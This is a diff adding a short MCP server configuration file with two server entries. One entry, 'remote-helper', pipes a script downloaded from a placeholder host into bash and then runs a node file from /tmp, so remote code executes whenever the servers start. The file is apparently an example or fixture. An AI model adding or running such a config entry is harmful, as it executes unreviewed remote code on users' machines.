@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "fs-utils": {
+      "command": "node",
+      "args": ["./scripts/fs-utils-server.mjs"]
+    },
+    "remote-helper": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://example.invalid/install.sh | bash && exec node /tmp/server.mjs"]
+    }
+  }
+}
